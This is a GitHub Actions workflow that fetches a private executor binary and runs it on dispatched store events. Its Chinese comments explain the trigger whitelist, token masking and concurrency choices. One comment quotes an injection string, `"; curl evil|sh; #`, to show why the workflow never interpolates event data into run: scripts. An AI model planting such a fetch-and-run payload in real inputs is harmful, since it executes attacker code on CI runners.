name: on-dispatch

# 触发面白名单（03 §4.2）。**不要加下面这几个**：
#
#   issues / issue_comment   —— forge 是公有仓库，任何登录用户都能触发，
#                               而 job 里带着能写 store 的 PAT。
#   pull_request_target      —— fork 可触发且带 secret + 读写 token，
#                               公有仓库最经典的泄密面。
#   release / push           —— forge 不承载数据，这两个事件在这里没有语义，
#                               白白扩大攻击面。store 侧的事件由 store 自己转发过来。
on:
  repository_dispatch:
    types: [store-event]
  # 手动按钮。§3.2 的搬运只有两种叫法（另一种是 store 侧上传 CI 发的信标），这是
  # 其中"人点"那一种 —— 队列常驻 draft，没有"发布即搬运"那条自动路了，所以人传完
  # 文件必须点一次按钮。
  #
  # ⚠️ 按钮在 store 侧也有一份（forward.yml 的 workflow_dispatch，`verb` 同一套），
  # 那是**日常入口**：人是在 store 的 Release 页面上传的文件，按钮就在同一页。这里
  # 这个留着是给改执行体的人调试用的，两边等效 —— 别把哪个当成多余的删掉。
  #
  # why choice 而不是自由文本：choice 的取值由 GitHub 服务端**先校验**（只可能是
  # 下面 options 里的字面量），到 job 里时已经是一个封闭集合的成员。它随后仍然
  # 走 env: 传下去、run: 里一个字都不插值 —— 和 store 侧同一个规矩，即使这里
  # 的输入来自界面而不是 issue 标题。
  workflow_dispatch:
    inputs:
      verb:
        description: 手动跑哪一件事
        type: choice
        options:
          - intake-incoming
          - reconcile
        default: intake-incoming

# 本仓库**只有 workflow，没有任何源码**，所以 GITHUB_TOKEN 一个权限都不需要：
# 执行体走 PAT 从 forge-core 拉，写 store 也走同一把 PAT（§6.2 不变量 1）——
# 而 PAT 权限是 per-repo 的，这里给得越小越好。
permissions: {}

# 所有会**写 store** 的 job 共用一个并发组，于是它们互相排队（见 reconcile.yml 里
# 同名的一组）。串行化的收益是消灭一整类竞态：两个事件同时往同一个 Release 传 asset、
# 或一个对账正推到一半另一个事件又推一次（非快进拒绝）。
#
# cancel-in-progress 必须是 false：这些 job 是**维护动作**，中途取消会留下
# "asset 传了一半、清单还没重建"的中间态。排队等一会儿是更好的代价。
# 一天也就几次事件，串行的代价约等于零。
concurrency:
  group: store-write
  cancel-in-progress: false

jobs:
  handle:
    runs-on: ubuntu-latest
    # 兜底。正常一次几秒到几分钟；卡住时在这里被砍掉，而不是占满 6 小时的默认额度。
    timeout-minutes: 45
    env:
      # 上游 asset 名。action 按 **asset 原名**落盘、不改成别的名字，所以它同时
      # 就是本地文件名 —— 下面 `Make executable` 与各 run: 步骤都靠它拼路径。
      # ⚠️ 改这里要同时改 `Fetch executor` 的 `with.fileName`（两处必须一致）。
      EXEC_ASSET: forge-linux-amd64
    steps:
      # 本 job **不 checkout 任何东西** —— 这里没有源码要取，而 store 是二进制
      # 自己浅克隆的（STORE_DIR 留空）。二进制的 git 封装用 `-c credential.helper=`
      # 一次性传凭据，token 不落盘。
      #
      # ⚠️ 但"不 checkout"**不再**等于"PAT 碰不到本 job"：取件改成 action 之后，
      # PAT 是作为 `with.token` 交给一段第三方代码的。这是本次换件的代价，记在
      # README 的「执行体从哪来」与 03 §4.5 第 11 条。
      #
      # ⚠️ 掩码**必须先于**它要覆盖的输出。`::add-mask::` 是 job 级生效的：本步
      # 注册之后，余下所有 step 的日志 —— **包括下面那个 action 自己打的** ——
      # 都会被遮蔽。换成 action 之后我们没法再在它的 `run:` 里发这一句（它没有
      # run:），所以拆成一个独立 step 放在它前面，而不是干脆不发。
      - name: Mask token
        env:
          MASK: ${{ secrets.GH_PAT }}
        run: echo "::add-mask::$MASK"

      - name: Fetch executor
        uses: robinraju/release-downloader@v1
        with:
          repository: market-of-labs/forge-core
          # 不钉 tag = **浮动取 latest**（刻意的，见 README「执行体从哪来」）。
          latest: true
          fileName: forge-linux-amd64
          # 只能是 $GITHUB_WORKSPACE 下的相对路径。本 job 没有 checkout，但那个
          # 目录 runner 已经建好了 —— 空着，正好放一个二进制。
          out-file-path: .
          # ⚠️ 不能吃默认值（默认是 `github.token`）：forge-core 是私有仓库，
          # GITHUB_TOKEN 跨不了仓库（§6.2 不变量 1）。
          token: ${{ secrets.GH_PAT }}

      - name: Make executable
        # Release asset 不带执行位，得自己补。路径落在 $GITHUB_WORKSPACE 而不是
        # 原来的 $RUNNER_TEMP —— 这个 action 只往工作目录里放东西。
        run: chmod +x "$GITHUB_WORKSPACE/$EXEC_ASSET"

      - name: Handle event
        env:
          # 一切外部数据只经 env 传入；run: 里是固定脚本文本（禁止 ${{ }} 插值）。
          # 这一条与 store 侧 forward.yml 是同一个理由：`${{ }}` 在 run: 里是
          # 文本拼接，issue 标题里放一个 `"; curl evil|sh; #` 就能执行。
          STORE_TOKEN: ${{ secrets.GH_PAT }}
          # 手动按钮时 client_payload 不存在，于是落到第一个分支（verb）。
          EVENT: ${{ github.event.inputs.verb || github.event.client_payload.event || github.event_name }}
          ISSUE: ${{ github.event.client_payload.issue }}
          SHA: ${{ github.event.client_payload.sha }}
          REF: ${{ github.event.client_payload.ref }}
        run: |
          set -euo pipefail
          echo "::add-mask::$STORE_TOKEN"
          "$GITHUB_WORKSPACE/$EXEC_ASSET" handle-dispatch

      # 注意手动按钮时 client_payload 是空的，EVENT 就是上面那个 verb：
      # 默认的 intake-incoming = 搬一次队列（§3.2），选 reconcile = 全量对账（§4.3）。
      # 缺省值刻意选"搬队列"：手动点这个按钮的九成场景是刚往 _incoming 传完文件。
